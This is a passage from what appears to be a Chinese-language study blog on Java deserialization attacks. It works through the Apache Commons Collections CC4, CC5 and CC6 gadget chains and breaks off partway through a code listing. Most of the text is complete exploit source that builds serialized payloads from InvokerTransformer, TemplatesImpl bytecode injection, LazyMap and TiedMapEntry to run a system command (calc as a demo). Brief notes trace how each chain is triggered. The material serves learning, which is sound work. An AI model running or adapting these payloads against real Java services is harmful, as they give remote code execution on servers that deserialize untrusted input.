class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections5</li></ul><p>cc5跟过一次。当时没用jdk1.7的环境。现在实验下jdk1.7 + cc3依赖的exp.另外发现这个链子cc3,cc4依赖都可以使用。貌似是ysoserial只写了cc3的链子。稍微改下就可以用在cc4的环境了。</p><p>首先重点还是构造链子来调用喜闻乐见的反射transform rce payload.这里的方法在第一篇学反序列化时已经跟过了</p><p>然后是一个细节：</p><blockquote><p><code>TransformedMap.decorate()</code>方法能将普通的MapA转换为TransformedMapB，同时如果<code>TransformedMap.decorate()</code>方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer</p></blockquote><p>之所以提到<code>decorate()</code>是因为我自己这一部分cc1的链子在书写exp中用的是反射实例化的lazymap。当时只是跟着别人的exp用反射实例化了，结果后来发现明明cc3依赖中直接decorate就可以创建lazymap。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/39.PNG" alt><br>这个方法在cc4依赖中变为了LazpMap方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/40.PNG" alt></p><p>然后核心还是跟cc1一样,此时只要一个调用LazyMap#get的位置来触发rce。</p><p>用到的gadget是TiedMapEntry#toString =&gt; getValue =&gt; get.需要this.map为LazyMap.跟过一遍就不再说了。</p><p>再接下来是BadAttributeValueExpException来触发toString.<br>因为其readObject中<code>valobj.toString</code>的valobj来自输入的val。所以直接反射设置为TiedMapEntry即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(badAttributeValueExpException);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后上面说了。换成cc4依赖是通杀的。我们只需将exp中依赖全部换成4的，然后decorate方法换成lazyMap来实例化LazyMap即可</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(badAttributeValueExpException);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections6</li></ul><p>比较类似CC5的链子。然后利用环境也是3,4通杀。</p><p>cc6的gadget与cc5的区别在于没有利用TiedMapEntry#toString,而是TiedMapEntry#hashCode</p><p>这个方法在URLDNS中出现过,在反序列化时会重新计算对象的 hashCode.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟toString一样调用了getValue。所以就基本一样了。</p><p>触发hashcode的方法是利用Hashmap类的hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加上hashMap.put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样就可以直接put触发了。然后官方的链子不知道为啥加上了一个Hashset,有点奇怪。</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span 